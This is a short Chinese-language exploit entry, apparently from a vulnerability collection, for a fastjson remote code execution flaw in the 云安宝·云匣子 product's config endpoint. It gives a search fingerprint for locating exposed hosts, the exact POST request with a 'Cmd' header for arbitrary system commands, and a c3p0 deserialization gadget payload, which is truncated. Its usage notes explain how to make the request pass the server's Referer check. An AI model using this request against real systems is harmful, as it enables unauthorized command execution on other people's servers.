# 云安宝-云匣子config存在fastjson远程代码执行漏洞

- **系统**：云安宝-云匣子　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="云安宝·云匣子"`
- **请求**：`POST /3.0/authService/config HTTP/2`

**请求体 / payload**
```
请求包中的 Referer 不能删，服务端会检测该字段，需要改为对应的Hostname，可修改cmd为系统命令，获取执行结果
Host: xx.xx.xx.xx
Content-Type: application/json;charset=UTF-8
Referer: https://xx.xx.xx.xx
Cmd: whoami
Priority: u=1, i
Content-Length: 18907
{"a":{"@type":"java.lang.Class","val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"b":{"@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616…（脚本共 19113 字，完整版见原文）
```

**其他**
- 云安宝-云匣子 config 存在fastjson远程代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 云安宝·云匣子